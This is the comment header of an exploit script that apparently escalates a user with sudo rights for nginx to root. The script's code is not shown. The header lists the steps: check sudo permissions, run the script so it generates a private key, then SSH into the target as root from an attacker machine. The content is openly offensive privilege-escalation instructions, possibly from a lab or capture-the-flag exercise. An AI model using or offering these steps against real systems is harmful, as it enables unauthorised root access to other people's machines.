# Exploit scenario:
# - You need sudo permissions for nginx (verify with: sudo -l)
# - Place this script in a directory writable by your user (had issues with /tmp)
# - Make it executable (chmod +x exploit.sh) and run it
# - The script generates private key so you can copy it
# - On your attacker machine, save the private key to a file (e.g. root_key), then:
#     chmod 600 root_key
#     ssh -i root_key root@<target_ip>
